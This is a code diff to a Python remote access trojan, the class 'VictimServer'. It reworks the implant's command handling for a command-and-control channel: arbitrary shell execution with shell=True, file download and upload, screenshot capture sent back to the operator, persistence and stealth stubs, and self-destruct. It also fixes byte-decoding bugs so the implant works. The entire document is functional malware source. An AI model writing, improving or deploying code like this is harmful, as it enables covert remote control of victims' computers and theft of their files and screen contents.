@@ -100,72 +100,89 @@ class VictimServer:
 
                 print(f"[*] Received command: {command[:50]}...")
 
-                # Command handling logic
-                if command.startswith('download '):
+                if command.startswith(b'DL '):
                     self.handle_download(command)
-                elif command.startswith('upload '):
+                elif command.startswith(b'UL '):
                     self.handle_upload(command)
-                elif command == 'screenshot':
+                elif command == b'SCREENSHOT':
                     self.handle_screenshot()
-                elif command == 'persist':
+                elif command.startswith(b'PERSIST '):
                     self._safe_send(b"Persistence installed")
-                elif command == 'kill':
+                elif command.startswith(b'STEALTH '):
+                    mode = command.split(b' ', 1)[1].decode()
+                    self._safe_send(f"Stealth mode: {mode}".encode())
+                elif command == b'KILL':
                     self.self_destruct()
+                elif command.startswith(b'CMD '):
+                    self.handle_shell_command(command[4:])  # Remove "CMD " prefix
                 else:
-                    self.handle_shell_command(command)
+                    self._safe_send(b"Unknown command")
 
             except Exception as e:
                 print(f"[!] Command error: {str(e)}")
                 if self.running:
                     self.connect_c2()
 
-    def handle_shell_command(self, command):
-        """Execute system commands safely"""
-        try:
-            proc = subprocess.Popen(command,
-                                    shell=True,
-                                    stdout=subprocess.PIPE,
-                                    stderr=subprocess.PIPE,
-                                    stdin=subprocess.PIPE)
-            stdout, stderr = proc.communicate(timeout=30)
-            output = stdout or stderr or b"No output"
-            self._safe_send(output)
-        except Exception as e:
-            self._safe_send(f"Command failed: {str(e)}".encode())
-
-    def handle_download(self, command):
-        """File download handler"""
-        try:
-            file_path = command.split(' ', 1)[1]
-            if not os.path.exists(file_path):
-                self._safe_send(b"File not found")
-                return
-
-            print(f"[*] Preparing to send file: {file_path}")
-            self.send_file(file_path)
-
-        except Exception as e:
-            self._safe_send(f"Download error: {str(e)}".encode())
-
-    def handle_upload(self, command):
-        """File upload handler"""
-        try:
-            file_path = command.split(' ', 1)[1]
-            print(f"[*] Preparing to receive file: {file_path}")
-            self.receive_file(file_path)
-        except Exception as e:
-            self._safe_send(f"Upload error: {str(e)}".encode())
-
     def handle_screenshot(self):
         """Cross-platform screenshot handling"""
         try:
-            from PIL import ImageGrab
+            from PIL import ImageGrab  # Ensure pillow library is installed
             filename = f"/tmp/screenshot_{int(time.time())}.jpg"
             ImageGrab.grab().save(filename, quality=SCREENSHOT_QUALITY)
             self.send_file(filename)
             os.remove(filename)
+        except ImportError:
+            self._safe_send(b"Screenshot requires PIL library")
         except Exception as e:
             self._safe_send(f"Screenshot failed: {str(e)}".encode())
+
+    def _calculate_hash(self, path):
+        """Calculate SHA-256 hash of a file"""
+        sha = hashlib.sha256()
+        with open(path, 'rb') as f:
+            while True:
+                chunk = f.read(4096)
+                if not chunk:
+                    break
+                sha.update(chunk)
+        return sha.hexdigest()
+
+    def handle_shell_command(self, command):
+        """Execute system commands safely"""
+        try:
+            cmd_str = command.decode('utf-8')
+            proc = subprocess.Popen(
+                cmd_str,
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            stdout, stderr = proc.communicate(timeout=30)
+            output = stdout or stderr or b"No output"
+            self._safe_send(output)
+        except Exception as e:
+            self._safe_send(f"Command failed: {e}".encode())
+
+    def handle_download(self, command):
+        """File download handler"""
+        try:
+            cmd_str = command.decode('utf-8')  # Decode bytes to string first
+            file_path = cmd_str.split(' ', 1)[1]  # Now split the string
+            if not os.path.exists(file_path):
+                self._safe_send(b"File not found")
+                return
+            self.send_file(file_path)
+        except Exception as e:
+            self._safe_send(f"Download error: {e}".encode())
+
+    def handle_upload(self, command):
+        """File upload handler"""
+        try:
+            cmd_str = command.decode('utf-8')
+            remote_path = cmd_str.split(' ', 1)[1]
+            self.receive_file(remote_path)
+        except Exception as e:
+            self._safe_send(f"Upload error: {e}".encode())
 
     def send_file(self, file_path):
         """Secure file transfer protocol"""
